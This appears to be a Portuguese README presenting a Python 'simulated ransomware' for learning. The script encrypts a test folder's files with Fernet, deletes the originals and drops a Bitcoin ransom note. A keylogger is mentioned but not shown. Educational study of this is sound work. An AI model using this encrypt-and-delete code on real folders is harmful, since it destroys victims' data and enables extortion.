# Ransomware-Simulado
Implementei simulações de Ransomware e Keylogger em Python, com foco em aprendizado e defesa.

import os
from cryptography.fernet import Fernet
import base64

# Função para gerar chave de criptografia (simula uma chave secreta)
def gerar_chave():
    return Fernet.generate_key()

# Função para criptografar arquivos
def criptografar_arquivos(pasta, chave):
    fernet = Fernet(chave)
    for arquivo in os.listdir(pasta):
        caminho = os.path.join(pasta, arquivo)
        if os.path.isfile(caminho) and not arquivo.endswith('.encrypted'):
            with open(caminho, 'rb') as f:
                dados = f.read()
            dados_criptografados = fernet.encrypt(dados)
            with open(caminho + '.encrypted', 'wb') as f:
                f.write(dados_criptografados)
            os.remove(caminho)  # Remove o original (simulação de sequestro)

# Função para descriptografar arquivos
def descriptografar_arquivos(pasta, chave):
    fernet = Fernet(chave)
    for arquivo in os.listdir(pasta):
        caminho = os.path.join(pasta, arquivo)
        if arquivo.endswith('.encrypted'):
            with open(caminho, 'rb') as f:
                dados_criptografados = f.read()
            dados = fernet.decrypt(dados_criptografados)
            caminho_original = caminho.replace('.encrypted', '')
            with open(caminho_original, 'wb') as f:
                f.write(dados)
            os.remove(caminho)

# Função para criar mensagem de resgate
def criar_mensagem_resgate(pasta, chave):
    mensagem = f"""
    Seus arquivos foram criptografados!
    Para recuperar, pague 1 Bitcoin para a carteira: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    Em seguida, envie a chave de descriptografia: {base64.b64encode(chave).decode()}
    (Isso é uma simulação - não pague nada!)
    """
    with open(os.path.join(pasta, 'RESGATE.txt'), 'w') as f:
        f.write(mensagem)

# Simulação principal
if __name__ == "__main__":
    pasta_teste = './pasta_teste'  # Crie uma pasta com arquivos de teste (ex: texto.txt)
    os.makedirs(pasta_teste, exist_ok=True)
    
    chave = gerar_chave()
    print("Chave gerada (guarde para descriptografia):", base64.b64encode(chave).decode())
    
    # Criptografa
    criptografar_arquivos(pasta_teste, chave)
    criar_mensagem_resgate(pasta_teste, chave)
    print("Arquivos criptografados. Mensagem de resgate criada.")
    
    # Para descriptografar (descomente após teste)
    # descriptografar_arquivos(pasta_teste, chave)
    # print("Arquivos descriptografados.")
